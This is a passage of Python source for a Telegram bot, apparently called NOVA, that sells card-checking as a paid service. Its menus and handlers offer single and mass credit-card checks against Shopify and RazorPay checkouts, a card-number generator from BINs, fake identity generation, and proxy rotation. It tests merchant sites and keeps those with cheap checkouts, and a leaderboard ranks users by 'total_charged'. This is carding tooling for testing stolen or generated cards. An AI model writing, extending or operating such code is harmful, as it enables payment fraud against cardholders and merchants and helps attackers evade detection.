    'NP': {'name':'Nepal','phone_code':'+977','len':10,'cities':[('Kathmandu','BA','44600'),('Pokhara','GA','33700')],'streets':['Durbar Marg','New Road'],'first':['Ram','Sita','Krishna'],'last':['Sharma','Thapa','Gurung']},
}

def _fake_phone(code):
    d = FAKE_DATA[code]; n = d['len']
    if code in ('US', 'CA'):
        area = str(random.randint(2, 9)) + ''.join(str(random.randint(0, 9)) for _ in range(2))
        mid = str(random.randint(2, 9)) + ''.join(str(random.randint(0, 9)) for _ in range(2))
        return f"({area}) {mid}-{''.join(str(random.randint(0, 9)) for _ in range(4))}"
    return f"{d['phone_code']} {''.join(str(random.randint(0, 9)) for _ in range(n))}"

# ═════════ ═════════ HANDLERS ═════════ ═════════

# ── /start ──
@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start(event):
    try:
        await ensure_user(event.sender_id)
        if not await force_join_check(event): return
        _, at = await can_use(event.sender_id, event.chat)
        if at == "banned":
            t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
        plan = await get_user_plan(event.sender_id); limit = get_cc_limit(plan, event.sender_id)
        if is_paid_plan(plan):
            pe_ = "🛠️"
            for pi in PLANS.values():
                if pi["tier"].lower() == plan.lower(): pe_ = pi["emoji"]; break
            sl = f"{PE} <b>{bs('STATUS')}</b> ━ {pe_} <b>{plan.upper()}</b> {PE} (<code>{limit}</code> {bs('Mass Limit')})"
            se = [CE["star"], CE["crown"]]
        else:
            sl = f"<b>{bs('STATUS')}</b> ━ 🆓 <b>{plan.upper()}</b> (<code>{FREE_SP_DAILY_LIMIT}/{bs('day')}</code> {bs('in group')})"
            se = []
        text = f"""{PE} <b><i>{bs('Shopify')}</i></b>
|   {PE} <code>/sp</code> ━ <b>{bs('Single CC')}</b>
|   {PE} <code>/msp</code> ━ <b>{bs('Mass CC')}</b>

{PE} <b><i>{bs('RazorPay')}</i></b>
|   {PE} <code>/rz</code> ━ <b>{bs('Single CC')}</b>
|   {PE} <code>/mrz</code> ━ <b>{bs('Mass CC')}</b>

{PE} <b><i>{bs('Sites')}</i></b>
|   {PE} <code>/add</code> ━ <b>{bs('Add sites')}</b>
|   {PE} <code>/rm</code> ━ <b>{bs('Remove')}</b>
|   {PE} <code>/sites</code> ━ <b>{bs('View')}</b>
|   {PE} <code>/site</code> ━ <b>{bs('Test all')}</b>

{PE} <b><i>{bs('Proxy')}</i></b>
|   {PE} <code>/addpxy</code> ━ <b>{bs('Add')}</b>
|   {PE} <code>/proxy</code> ━ <b>{bs('View')}</b>
|   {PE} <code>/chkpxy</code> ━ <b>{bs('Test')}</b>
|   {PE} <code>/rmpxy</code> ━ <b>{bs('Remove')}</b>

{PE} <b><i>{bs('Tools')}</i></b>
|   {PE} <code>/bin</code> ━ <b>{bs('BIN Lookup')}</b>
|   {PE} <code>/gen</code> ━ <b>{bs('Card Gen')}</b>
|   {PE} <code>/scg</code> ━ <b>{bs('Site Scanner')}</b>
|   {PE} <code>/ip</code> ━ <b>{bs('IP Lookup')}</b>
|   {PE} <code>/iban</code> ━ <b>{bs('IBAN Check')}</b>
|   {PE} <code>/fake</code> ━ <b>{bs('Fake ID')}</b>
|   {PE} <code>/split</code> ━ <b>{bs('Split File')}</b>

{PE} <b><i>{bs('Account')}</i></b>
|   {PE} <code>/info</code> ━ <b>{bs('Profile')}</b>
|   {PE} <code>/plan</code> ━ <b>{bs('Plans')}</b>
|   {PE} <code>/me</code> ━ <b>{bs('My Stats')}</b>
|   {PE} <code>/streak</code> ━ <b>{bs('Streak')}</b>
|   {PE} <code>/ref</code> ━ <b>{bs('Referrals')}</b>
|   {PE} <code>/redeem</code> ━ <b>{bs('Redeem Key')}</b>
<b>{SEP}</b>
{sl}"""
        kb = [[pbtn(bs("Plans"), data="show_plans"), pbtn(bs("Tools"), data="tools_menu")],
              [pbtn(bs("Support"), url=OWNER_LINK), pbtn(bs("Referrals"), data="ref_menu")],
              [pbtn(bs("Channel"), url=JOIN_CHANNEL_LINK), pbtn(bs("Group"), url=JOIN_GROUP_LINK)]]
        ei = [CE["bolt"], CE["search"], CE["pin"], CE["fire"], CE["search"], CE["pin"], CE["brain"], CE["plus"], CE["cross"], CE["globe"], CE["link"], CE["shield"], CE["link"], CE["eyes"], CE["tick"], CE["trash"], CE["info"], CE["info"]] + se
        await styled_reply(event, text, buttons=kb, emoji_ids=ei)
    except Exception as e:
        log_user(event.sender_id, "START_ERROR", f"{e}", "error")

@client.on(events.CallbackQuery(data=b"check_joined"))
async def check_joined_cb(event):
    uid = event.sender_id
    if uid in ADMIN_ID: return await event.answer(f"✅ {bs('Admin')}!")
    if await is_user_joined(uid):
        await mark_user_joined(uid); await event.answer(f"✅ {bs('Verified')}!", alert=True)
        try: await event.delete()
        except Exception: pass
        await styled_send(event.chat_id, f"{PE} <b>{bs('Welcome')}</b> {PE}\n{PE} <code>/start</code> <b>{bs('for commands')}</b>", emoji_ids=[CE["fire"],CE["fire"],CE["info"]])
    else: await event.answer(f"❌ {bs('Not joined')}!", alert=True)

@client.on(events.CallbackQuery(data=b"show_plans"))
async def plans_cb(event):
    cp = await get_user_plan(event.sender_id); await event.answer()
    t = f"{PE} <b>{bs('Plans')}</b> {PE}\n<b>{SEP}</b>"
    for pid, pi in PLANS.items(): t += f"\n{pi['emoji']} <b>{pi['name']}</b> ━ <b>{pi['duration_days']}{bs('d')}</b> ━ <b>{pi['price']}</b>"
    t += f"\n<b>{SEP}</b>\n{PE} <b>{bs('Current')}:</b> <b>{cp.upper()}</b>"
    await styled_send(event.chat_id, t, buttons=[[pbtn(bs("Upgrade"), url=OWNER_LINK)]], emoji_ids=[CE["fire"],CE["fire"],CE["crown"]])

@client.on(events.CallbackQuery(data=b"tools_menu"))
async def tools_cb(event):
    await event.answer()
    t = f"{PE} <b>{bs('Tools')}</b> {PE}\n<b>{SEP}</b>\n{PE} <code>/bin 515462</code> ━ {bs('BIN Lookup')}\n{PE} <code>/gen 515462 10</code> ━ {bs('Card Gen')}\n{PE} <code>/scg site.com</code> ━ {bs('Site Scanner')}\n{PE} <code>/ip 8.8.8.8</code> ━ {bs('IP Lookup')}\n{PE} <code>/iban GB82...</code> ━ {bs('IBAN Check')}\n{PE} <code>/fake US</code> ━ {bs('Fake Identity')}\n{PE} <code>/split 1000</code> ━ {bs('Split .txt')}\n<b>{SEP}</b>\n{PE} <code>/ping</code> ━ {bs('Latency')}\n{PE} <code>/id</code> ━ {bs('Your IDs')}\n{PE} <code>/help</code> ━ {bs('All commands')}"
    await styled_send(event.chat_id, t, buttons=[[pbtn(bs("Back"), data="main_menu")]], emoji_ids=[CE["fire"],CE["fire"]])

@client.on(events.CallbackQuery(data=b"main_menu"))
async def main_menu_cb(event):
    await event.answer()
    await styled_send(event.chat_id, f"{PE} <b>{bs('Menu')}</b> {PE}\n{PE} <code>/start</code> {bs('for commands')}", buttons=[[pbtn(bs("Back"), data="tools_menu")]], emoji_ids=[CE["fire"],CE["fire"],CE["info"]])

@client.on(events.CallbackQuery(data=b"ref_menu"))
async def ref_menu_cb(event):
    await event.answer()
    s = ref_stats(event.sender_id); code = s["code"]
    try:
        me = await client_instance.get_me(); bot_user = me.username or "YourBot"
    except Exception: bot_user = "YourBot"
    link = f"https://t.me/{bot_user}?start=ref_{code}"
    every = REFERRAL_MILESTONE_EVERY; inc = s["confirmed"] % every
    bar = "▰" * inc + "▱" * (every - inc)
    t = f"{PE} <b>{bs('Referral Program')}</b>\n<b>{SEP}</b>\n🔗 <code>{link}</code>\n🔑 <code>{code}</code>\n<b>{SEP}</b>\n📊 {bs('Confirmed')}: <code>{s['confirmed']}</code> · ⏳ {bs('Pending')}: <code>{s['pending']}</code>\n\n📈 <code>{bar}</code> {inc}/{every}\n🎯 {bs('Next in')}: <code>{s['next_milestone_in']}</code>\n\n💎 <b>{bs('Reward')}</b>: <code>+{REFERRAL_MILESTONE_HOURS}h +{REFERRAL_MILESTONE_CC_LIMIT} CC</code> {bs('every')} <code>{every}</code>"
    await styled_send(event.chat_id, t, buttons=[[pbtn(bs("Back"), data="main_menu")]], emoji_ids=[CE["fire"],CE["fire"]])

# ── /plan /info /me /rank /streak /ref /topref /help /ping /id /api /version ──
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan$'))
async def show_plans(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    cp = await get_user_plan(event.sender_id)
    t = f"{PE} <b>{bs('Plans')}</b> {PE}\n<b>{SEP}</b>"
    for pid, pi in PLANS.items(): t += f"\n{pi['emoji']} <b>{pi['name']}</b> ━ <b>{pi['duration_days']}{bs('d')}</b> ━ <b>{pi['price']}</b>"
    t += f"\n<b>{SEP}</b>\n{PE} <b>{bs('Current')}:</b> <b>{cp.upper()}</b>\n{PE} <i>{bs('Contact admin')}</i>"
    await styled_reply(event, t, buttons=[[pbtn(bs("Upgrade"), url=OWNER_LINK)]], emoji_ids=[CE["fire"],CE["fire"],CE["crown"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]info$'))
async def info_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    await ensure_user(event.sender_id)
    plan = await get_user_plan(event.sender_id); sites = await get_user_sites(event.sender_id); pc = await get_proxy_count(event.sender_id)
    pe_ = "🆓"
    for pi in PLANS.values():
        if pi["tier"].lower() == plan.lower(): pe_ = pi["emoji"]; break
    ud = await db["users"].find_one({"user_id": event.sender_id})
    exp = ud.get("expiry") if ud else None
    exp_str = exp.strftime('%Y-%m-%d') if exp else bs("Never")
    status = bs("Active") if is_paid_plan(plan) else bs("Free")
    lt = f"<code>{get_cc_limit(plan, event.sender_id)}</code>" if is_paid_plan(plan) else f"<code>{FREE_SP_DAILY_LIMIT}/{bs('day')}</code>"
    used = get_free_sp_usage(event.sender_id)
    ul = f"\n{PE} <b>{bs('Used Today')}:</b> <code>{used}/{FREE_SP_DAILY_LIMIT}</code>" if not is_paid_plan(plan) and event.sender_id not in ADMIN_ID else ""
    await styled_reply(event, f"{PE} <b>{bs('Profile')}</b> {PE}\n<b>{SEP}</b>\n{PE} <b>{bs('ID')}:</b> <code>{event.sender_id}</code>\n{PE} <b>{bs('Status')}:</b> <code>{status}</code>\n{PE} <b>{bs('Plan')}:</b> {pe_} <b>{plan.upper()}</b>\n{PE} <b>{bs('Expiry')}:</b> <code>{exp_str}</code>\n{PE} <b>{bs('Limit')}:</b> {lt}{ul}\n{PE} <b>{bs('Sites')}:</b> <code>{len(sites)}</code>\n{PE} <b>{bs('Proxies')}:</b> <code>{pc}/100</code>", emoji_ids=[CE["fire"],CE["fire"],CE["info"],CE["star"],CE["crown"],CE["chart"],CE["globe"],CE["link"],CE["shield"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]me$'))
async def me_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    uid = event.sender_id
    try:
        s = await event.get_sender(); username = s.username or f"user_{uid}"; name = s.first_name or username
    except Exception: username, name = f"user_{uid}", "User"
    st = get_streak(uid); plan = await get_user_plan(uid); pc = await get_proxy_count(uid); ps = len(await get_user_sites(uid)); rs = ref_stats(uid)
    tier = f"👑 {bs('Admin')}" if uid in ADMIN_ID else (f"💎 {bs(plan)}" if is_paid_plan(plan) else f"🆓 {bs('Free')}")
    await styled_reply(event, f"{PE} <b>{bs('My Stats')}</b>\n<b>{SEP}</b>\n👤 <b>{name}</b> (@{username})\n🆔 <code>{uid}</code>\n🎖️ {bs('Tier')}: {tier}\n<b>{SEP}</b>\n🔥 {bs('Streak')}: <code>{st['current']}</code> (best <code>{st['best']}</code>)\n✅ {bs('Total Checks')}: <code>{st['total_checks']}</code>\n<b>{SEP}</b>\n👥 {bs('Referrals')}: <code>{rs['confirmed']}</code> (⏳ <code>{rs['pending']}</code>)\n💰 {bs('Ref Hours')}: <code>{rs['total_hours']}h</code>\n<b>{SEP}</b>\n🔌 {bs('Proxies')}: <code>{pc}</code>\n🌐 {bs('Sites')}: <code>{ps}</code>", buttons=[[pbtn(bs("Streak"), data="main_menu")]], emoji_ids=[CE["fire"],CE["fire"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]streak$'))
async def streak_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    st = get_streak(event.sender_id); cur = st["current"]
    up = [d for d in sorted(STREAK_MILESTONES.keys()) if d > cur]
    if up:
        tgt = up[0]; prev = max([d for d in STREAK_MILESTONES if d <= cur] + [0])
        span = tgt - prev; step = cur - prev
        bar = "▰" * max(0, step) + "▱" * max(0, span - step); nxt = f"{bs('Next')} <code>{tgt}d</code> · <code>{span-step}</code> {bs('left')}"
    else: bar = "▰" * 10; nxt = f"<i>{bs('Max reached')}</i>"
    ms = "\n".join(f"┣ {bs('Day')} <code>{d}</code> → <code>+{h}h</code>" for d, h in sorted(STREAK_MILESTONES.items()))
    await styled_reply(event, f"{PE} <b>{bs('Daily Streak')}</b>\n<b>{SEP}</b>\n📅 {bs('Current')}: <code>{cur}</code>\n🏆 {bs('Best')}: <code>{st['best']}</code>\n✅ {bs('Total')}: <code>{st['total_checks']}</code>\n\n{bar}\n{nxt}\n<b>{SEP}</b>\n🎁 <b>{bs('Milestones')}</b>\n{ms}", buttons=[[pbtn(bs("Back"), data="main_menu")]], emoji_ids=[CE["fire"],CE["fire"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rank$'))
async def rank_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    try: rank = await get_all_premium_users()
    except Exception: rank = []
    if not rank: return await styled_reply(event, f"{PE} <b>{bs('No charges yet')}</b>", emoji_ids=[CE["warn"]])
    top = sorted(rank, key=lambda x: x.get("total_charged", 0), reverse=True)[:10]
    medals = ["🥇","🥈","🥉"]; lines = []
    for i, u in enumerate(top):
        uid = u.get("user_id", "?")
        try:
            ent = await client_instance.get_entity(int(uid)); name = ent.first_name or str(uid)
        except Exception: name = str(uid)
        medal = medals[i] if i < 3 else f"<b>{i+1}.</b>"; lines.append(f"{medal} <b>{name}</b> — <code>{u.get('total_charged', 0)}</code>")
    await styled_reply(event, f"{PE} <b>{bs('Top 10')}</b>\n<b>{SEP}</b>\n" + "\n".join(lines), emoji_ids=[CE["fire"],CE["fire"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]ref(?:eral)?$'))
async def ref_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    s = ref_stats(event.sender_id); code = s["code"]
    try:
        me = await client_instance.get_me(); bot_user = me.username or "YourBot"
    except Exception: bot_user = "YourBot"
    link = f"https://t.me/{bot_user}?start=ref_{code}"
    every = REFERRAL_MILESTONE_EVERY; inc = s["confirmed"] % every
    bar = "▰" * inc + "▱" * (every - inc)
    await styled_reply(event, f"{PE} <b>{bs('Referral Program')}</b>\n<b>{SEP}</b>\n🔗 <code>{link}</code>\n🔑 <code>{code}</code>\n<b>{SEP}</b>\n📊 {bs('Confirmed')}: <code>{s['confirmed']}</code> · ⏳ {bs('Pending')}: <code>{s['pending']}</code>\n\n📈 <code>{bar}</code> {inc}/{every}\n🎯 {bs('Next in')}: <code>{s['next_milestone_in']}</code>\n\n💎 <b>{bs('Reward')}</b>: <code>+{REFERRAL_MILESTONE_HOURS}h</code> + <code>+{REFERRAL_MILESTONE_CC_LIMIT} CC</code>", buttons=[[pbtn(bs("Share"), url=f"https://t.me/share/url?url={link}&text=Join%20NOVA!")],[pbtn(bs("Back"), data="main_menu")]], emoji_ids=[CE["fire"],CE["fire"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.](refleaderboard|topref)$'))
async def topref_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    d = load_refs(); rows = []
    for uid_s, u in d["users"].items():
        cnt = len(u.get("rewarded", []))
        if cnt > 0: rows.append((uid_s, cnt, int(u.get("total_hours_earned", 0))))
    rows.sort(key=lambda x: x[1], reverse=True); rows = rows[:10]
    if not rows: return await styled_reply(event, f"{PE} <b>{bs('No referrers yet')}</b>", emoji_ids=[CE["warn"]])
    medals = ["🥇","🥈","🥉"]; lines = []
    for i, (uid_s, cnt, hrs) in enumerate(rows):
        try:
            ent = await client_instance.get_entity(int(uid_s)); name = ent.first_name or uid_s
        except Exception: name = uid_s
        medal = medals[i] if i < 3 else f"<b>{i+1}.</b>"; lines.append(f"{medal} <b>{name}</b> — <code>{cnt}</code> refs")
    await styled_reply(event, f"{PE} <b>{bs('Top Referrers')}</b>\n<b>{SEP}</b>\n" + "\n".join(lines), emoji_ids=[CE["fire"],CE["fire"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]help$'))
async def help_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    await styled_reply(event, f"{PE} <b>{bs('All Commands')}</b>\n<b>{SEP}</b>\n<b>Shopify</b>: /sp /msp\n<b>RazorPay</b>: /rz /mrz\n<b>Sites</b>: /add /rm /sites /site\n<b>Proxy</b>: /addpxy /proxy /chkpxy /rmpxy\n<b>Tools</b>: /bin /gen /scg /ip /iban /fake /split\n<b>Account</b>: /info /plan /me /rank /streak /ref /redeem\n<b>System</b>: /ping /id /api /help\n<b>{SEP}</b>\n{PE} <code>/start</code> {bs('for menu')}", emoji_ids=[CE["fire"],CE["fire"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]ping$'))
async def ping_cmd(event):
    t = time.time(); m = await styled_reply(event, f"{PE} <code>...</code>", emoji_ids=[CE["online"]])
    if m:
        try: await styled_edit(m, f"{PE} <b>{bs('Pong')}</b> <code>{(time.time()-t)*1000:.1f}ms</code>", emoji_ids=[CE["online"]])
        except Exception: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]id$'))
async def id_cmd(event):
    await styled_reply(event, f"{PE} <b>{bs('IDs')}</b>\n<b>{SEP}</b>\n{PE} {bs('Your ID')}: <code>{event.sender_id}</code>\n{PE} {bs('Chat ID')}: <code>{event.chat_id}</code>", emoji_ids=[CE["info"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]api$'))
async def api_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    await styled_reply(event, f"{PE} <b>{bs('API Status')}</b>\n<b>{SEP}</b>\n{PE} {bs('Shopify')}: <code>{API_BASE_URL[:50]}</code>\n{PE} {bs('RazorPay')}: <code>{RAZORPAY_API_URL[:50]}</code>\n{PE} {bs('Mongo')}: <code>connected</code>", emoji_ids=[CE["shield"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]version$'))
async def version_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    await styled_reply(event, f"{PE} <b>Version</b>\n<b>{SEP}</b>\n📦 <code>v4.0.0</code>\n🤖 <code>{BOT_BRAND}</code>\n👤 <code>{BOT_USERNAME}</code>", emoji_ids=[CE["info"]])

# ── Site Management ──
@client.on(events.NewMessage(pattern=r'(?i)^[/.]add\b'))
async def add_site(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned":
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    try:
        sta = []
        if event.is_reply:
            rm = await event.get_reply_message()
            if rm and rm.file:
                fp = await rm.download_media()
                try:
                    async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as f: sta = extract_urls_from_text(await f.read())
                finally:
                    try: os.remove(fp)
                    except Exception: pass
            elif rm and rm.text: sta = extract_urls_from_text(rm.text)
        atxt = re.sub(r'^[/.]add\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
        if atxt:
            for s in extract_urls_from_text(atxt):
                if s not in sta: sta.append(s)
        if not sta: return await styled_reply(event, f"{PE} <b>{bs('Add Site')}</b>\n{PE} <code>/add site.com</code>\n{PE} <i>{bs('Or reply .txt with')}</i> <code>/add</code>", emoji_ids=[CE["info"]])
        en = {normalize_site_url(s) for s in await get_user_sites(event.sender_id)}
        new, already = [], []
        for site in sta:
            n = normalize_site_url(site)
            if n in en: already.append(n)
            elif n not in [normalize_site_url(s) for s in new]: new.append(n)
        if not new: return await styled_reply(event, f"{PE} <b>{bs('All sites already exist')}</b> · {bs('Dupes')}: <code>{len(already)}</code>", emoji_ids=[CE["warn"]])
        uid = event.sender_id
        PENDING_ADD_SITES[uid] = {"sites": new, "exists": already, "event": event}
        kb = [[pbtn(f"{bs('0-5 USD')}", f"addprice:5:{uid}"), pbtn(f"{bs('0-10 USD')}", f"addprice:10:{uid}")], [pbtn(f"{bs('0-20 USD')}", f"addprice:20:{uid}"), pbtn(f"{bs('0-40 USD')}", f"addprice:40:{uid}")]]
        await styled_reply(event, f"{PE} <b>{bs('Select Price Range')}</b>\n<b>{SEP}</b>\n{PE} <b>{bs('New')}:</b> <code>{len(new)}</code> | <b>{bs('Exist')}:</b> <code>{len(already)}</code>\n<b>{SEP}</b>", buttons=kb, emoji_ids=[CE["globe"],CE["warn"]])
    except Exception as e: await styled_reply(event, f"❌ <code>{e}</code>", emoji_ids=[CE["cross"]])

@client.on(events.CallbackQuery(pattern=rb"addprice:(\d+):(\d+)"))
async def add_price_cb(event):
    mp = int(event.pattern_match.group(1).decode()); uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = PENDING_ADD_SITES.pop(uid, None)
    if not data: return await event.answer(f"{bs('Expired')}!", alert=True)
    if uid in ACTIVE_ADD_PROCESSES: return await event.answer(f"{bs('Already running')}!", alert=True)
    ACTIVE_ADD_PROCESSES[uid] = True; await event.answer(f"{bs('Testing')}...")
    try: await event.delete()
    except Exception: pass
    asyncio.create_task(_process_add_sites(data["event"], data["sites"], mp))

async def _process_add_sites(event, new_sites, max_price):
    uid = event.sender_id; total = len(new_sites); tested = working = dead = added = 0
    proxies = await get_all_user_proxies(uid)
    sem = get_user_sem(uid, "site"); hs = await get_user_http_session(uid, "site")
    sm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {total}...</b>", emoji_ids=[CE["fire"]])
    last = [0]
    async def work(site):
        nonlocal tested, working, dead, added
        async with sem:
            if uid not in ACTIVE_ADD_PROCESSES: return
            try:
                res = await test_site(site, random.choice(proxies) if proxies else None, http_session=hs)
                tested += 1
                if res['status'] == 'alive':
                    working += 1; pv = 0
                    ps = res.get('price', '-')
                    if ps and ps != '-':
                        try: pv = float(str(ps).replace('$', '').strip())
                        except Exception: pass
                    if pv <= max_price and await add_site_db(uid, site): added += 1
                else: dead += 1
                if time.time() - last[0] > 3.0:
                    last[0] = time.time()
                    try: await styled_edit(sm, f"{PE} <b>{bs('Testing')}</b> {tested}/{total} | ✅{working} ❌{dead}", emoji_ids=[CE["fire"]])
                    except Exception: pass
            except asyncio.CancelledError: raise
            except Exception: dead += 1; tested += 1
    for i in range(0, len(new_sites), SITE_PER_USER_WORKERS):
        if uid not in ACTIVE_ADD_PROCESSES: break
        await asyncio.gather(*[asyncio.create_task(work(s)) for s in new_sites[i:i+SITE_PER_USER_WORKERS]], return_exceptions=True)
    try: await styled_edit(sm, f"{PE} <b>{bs('Complete')}</b> · ✅{working} · ❌{dead} · {bs('Added')}: <code>{added}</code>", emoji_ids=[CE["fire"]])
    except Exception: pass
    ACTIVE_ADD_PROCESSES.pop(uid, None); await cleanup_user_http_session(uid, "site"); cleanup_user_sem(uid)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm\b'))
async def remove_site(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned":
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    rt = re.sub(r'^[/.]rm\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if rt.lower() == 'all':
        ex = await get_user_sites(event.sender_id)
        if not ex: return await styled_reply(event, f"{PE} <b>{bs('No sites')}</b>", emoji_ids=[CE["warn"]])
        c = 0
        for s in ex:
            if await remove_site_db(event.sender_id, s): c += 1
        return await styled_reply(event, f"{PE} <b>{bs('Removed')} {c}</b>", emoji_ids=[CE["check"]])
    if not rt: return await styled_reply(event, f"{PE} <code>/rm site.com</code> {bs('or')} <code>/rm all</code>", emoji_ids=[CE["info"]])
    to_rm = extract_urls_from_text(rt)
    if not to_rm: return await styled_reply(event, f"{PE} {bs('No URLs')}", emoji_ids=[CE["cross"]])
    ex = await get_user_sites(event.sender_id); removed = 0
    for s in to_rm:
        n = normalize_site_url(s)
        for e in ex:
            if normalize_site_url(e) == n:
                if await remove_site_db(event.sender_id, e): removed += 1
                break
    await styled_reply(event, f"{PE} <b>{bs('Removed')}:</b> <code>{removed}</code>", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]sites$'))
async def list_sites(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    sites = await get_user_sites(event.sender_id)
    if not sites: return await styled_reply(event, f"{PE} <b>{bs('No sites')}</b> <code>/add</code>", emoji_ids=[CE["warn"]])
    t = f"{PE} <b>{bs('Sites')}</b> ({len(sites)})\n<b>{SEP}</b>\n"
    ei = [CE["fire"], CE["fire"]]
    for i, s in enumerate(sites[:50], 1): t += f"{PE} <code>{i}.</code> <b>{s}</b>\n"; ei.append(CE["link"])
    if len(sites) > 50: t += f"\n<i>+{len(sites)-50} more</i>"
    await styled_reply(event, t, emoji_ids=ei)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]site$'))
async def check_sites_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    sites = await get_user_sites(event.sender_id)
    if not sites: return await styled_reply(event, f"{PE} <b>{bs('No sites')}</b>", emoji_ids=[CE["warn"]])
    uid = event.sender_id; PENDING_SITE_CHECK[uid] = {"sites": sites, "event": event}
    kb = [[pbtn(f"{bs('0-5 USD')}", f"siteprice:5:{uid}"), pbtn(f"{bs('0-10 USD')}", f"siteprice:10:{uid}")], [pbtn(f"{bs('0-20 USD')}", f"siteprice:20:{uid}"), pbtn(f"{bs('0-40 USD')}", f"siteprice:40:{uid}")]]
    await styled_reply(event, f"{PE} <b>{bs('Select Price Range')}</b>\n{PE} <b>{bs('Sites')}:</b> <code>{len(sites)}</code>", buttons=kb, emoji_ids=[CE["globe"],CE["warn"]])

@client.on(events.CallbackQuery(pattern=rb"siteprice:(\d+):(\d+)"))
async def site_price_cb(event):
    mp = int(event.pattern_match.group(1).decode()); uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = PENDING_SITE_CHECK.pop(uid, None)
    if not data: return await event.answer(f"{bs('Expired')}!", alert=True)
    await event.answer(f"{bs('Checking')}...")
    try: await event.delete()
    except Exception: pass
    asyncio.create_task(_process_site_check(data["event"], data["sites"], mp))

async def _process_site_check(event, sites, max_price):
    uid = event.sender_id; total = len(sites); tested = alive = dead = kept = rmv = 0
    proxies = await get_all_user_proxies(uid); sem = get_user_sem(uid, "site"); hs = await get_user_http_session(uid, "site")
    sm = await styled_reply(event, f"{PE} <b>{bs('Checking')} {total}...</b>", emoji_ids=[CE["fire"]])
    last = [0]; dead_sites = set(); over_sites = set()
    async def work(site):
        nonlocal tested, alive, dead, kept, rmv
        async with sem:
            try:
                res = await test_site(site, random.choice(proxies) if proxies else None, http_session=hs)
                tested += 1
                if res['status'] == 'alive':
                    alive += 1; pv = 0; ps = res.get('price', '-')
                    if ps and ps != '-':
                        try: pv = float(str(ps).replace('$', '').strip())
                        except Exception: pass
                    if pv <= max_price: kept += 1
                    else: rmv += 1; over_sites.add(normalize_site_url(site))
                else: dead += 1; dead_sites.add(normalize_site_url(site))
                if time.time() - last[0] > 3.0:
                    last[0] = time.time()
                    try: await styled_edit(sm, f"{PE} <b>{tested}/{total}</b> | ✅{alive} ❌{dead}", emoji_ids=[CE["fire"]])
                    except Exception: pass
            except asyncio.CancelledError: raise
            except Exception: dead += 1; tested += 1; dead_sites.add(normalize_site_url(site))
    for i in range(0, len(sites), SITE_PER_USER_WORKERS):
        await asyncio.gather(*[asyncio.create_task(work(s)) for s in sites[i:i+SITE_PER_USER_WORKERS]], return_exceptions=True)
    for s in sites:
        n = normalize_site_url(s)
        if n in dead_sites or n in over_sites: await remove_site_db(uid, s)
    try: await styled_edit(sm, f"{PE} <b>{bs('Done')}</b> · ✅{alive} ❌{dead} · {bs('Kept')}: {kept}", emoji_ids=[CE["fire"]])
    except Exception: pass
    await cleanup_user_http_session(uid, "site"); cleanup_user_sem(uid)

# ── Proxy Management ──
@client.on(events.NewMessage(pattern=r'(?i)^[/.](addpxy|addproxy)'))
async def add_proxy_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
